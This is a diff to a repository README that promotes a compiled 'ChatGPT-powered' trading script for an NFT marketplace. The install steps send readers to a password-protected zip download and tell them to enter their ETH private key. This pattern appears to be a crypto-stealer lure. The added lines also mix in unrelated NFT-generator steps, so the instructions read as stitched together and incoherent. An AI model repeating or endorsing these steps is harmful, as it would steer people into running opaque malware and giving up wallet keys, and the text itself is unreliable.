@@ -21,7 +21,11 @@ This repository contains a compiled and optimized Python script designed for sea
 
 ## Installing
 - [Clone](https://github.com/origami-xyz/Tensor-trade-script/archive/refs/heads/main.zip) repository and extract files with password `Ci27S0etuIh`.
-- Edit `config.json` with your data and launch script.
+- Edit config.json with your data and launch script.
+- Add layer images by folders, set up rarity settings, select folder to save.
+- Input your ETH private key. Ensure that you do not utilize your primary account or seed phrase
+- Do not set the price higher than the floor! Otherwise, you risk losing all your ETH to random NFTs.
+
 
 ## Usage Instructions
 The repository includes comprehensive documentation and instructions for deploying and utilizing the compiled script. Follow the steps provided to set up and initiate trading activities within the TensorTrade NFT marketplace, benefitting from ChatGPT-powered strategies without extensive coding or configuration.
